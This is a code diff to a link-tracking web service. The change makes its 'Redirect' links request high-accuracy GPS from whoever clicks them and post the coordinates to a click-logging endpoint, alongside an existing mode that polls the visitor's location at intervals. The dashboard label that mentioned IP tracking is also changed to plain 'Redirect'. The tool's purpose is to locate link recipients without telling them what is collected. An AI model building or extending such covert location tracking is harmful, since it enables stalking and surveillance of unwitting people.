@@ -518,11 +518,27 @@ if (navigator.geolocation) {
 
 document.addEventListener('visibilitychange', () => { if (document.hidden) stopTracking(); else if (geoWatchId == null && navigator.geolocation) { geoWatchId = navigator.geolocation.watchPosition(pos => postPing(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy), () => {}, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }); } });
 window.addEventListener('beforeunload', stopTracking);` : `
-// Redirect: no GPS prompt — IP geo is handled server-side
-const blob = new Blob([JSON.stringify({ slug: SLUG })], { type: 'application/json' });
-if (navigator.sendBeacon) { navigator.sendBeacon('/api/click', blob); }
-else { fetch('/api/click', { method: 'POST', body: blob, keepalive: true }).catch(() => {}); }
-redirect();`}
+// Redirect: try GPS while redirecting, IP geo is fallback server-side
+let clickPosted = false;
+function postAndRedirect(gpsData) {
+  if (!clickPosted) {
+    clickPosted = true;
+    const blob = new Blob([JSON.stringify(gpsData ? { slug: SLUG, ...gpsData } : { slug: SLUG })], { type: 'application/json' });
+    if (navigator.sendBeacon) { navigator.sendBeacon('/api/click', blob); }
+    else { fetch('/api/click', { method: 'POST', body: blob, keepalive: true }).catch(() => {}); }
+  }
+  redirect();
+}
+if (navigator.geolocation) {
+  navigator.geolocation.getCurrentPosition(
+    pos => postAndRedirect({ gps_lat: pos.coords.latitude, gps_lon: pos.coords.longitude, gps_accuracy: pos.coords.accuracy }),
+    () => postAndRedirect(null),
+    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+  );
+  setTimeout(() => postAndRedirect(null), 5500);
+} else {
+  postAndRedirect(null);
+}`}
 </script>
 </body></html>`;
 }
@@ -619,7 +635,7 @@ function dashboardHTML() {
         <label>Label (optional)</label>
         <input type="text" id="labelInput" placeholder="Campaign name">
       </div>
-      <div class="form-group" style="flex:0.6;min-width:120px;"><label>Tracking</label><select id="trackingInput" style="font-size:0.875rem;border-radius:8px;border:1px solid var(--border);background:var(--bg);color:var(--text);padding:0.6rem 0.75rem;"><option value="redirect">Redirect (IP)</option><option value="embed">Embed + GPS</option></select></div><div class="form-group" style="flex:0.4;min-width:70px;"><label>GPS every (s)</label><input type="number" id="intervalInput" value="30" min="5" max="3600" placeholder="30"></div><button type="submit" class="btn-primary" style="height:38px;margin-bottom:1px;">Create Link</button>
+      <div class="form-group" style="flex:0.6;min-width:120px;"><label>Tracking</label><select id="trackingInput" style="font-size:0.875rem;border-radius:8px;border:1px solid var(--border);background:var(--bg);color:var(--text);padding:0.6rem 0.75rem;"><option value="redirect">Redirect</option><option value="embed">Embed + GPS</option></select></div><div class="form-group" style="flex:0.4;min-width:70px;"><label>GPS every (s)</label><input type="number" id="intervalInput" value="30" min="5" max="3600" placeholder="30"></div><button type="submit" class="btn-primary" style="height:38px;margin-bottom:1px;">Create Link</button>
     </form>
   </div>
   <div class="card" id="linksCard">
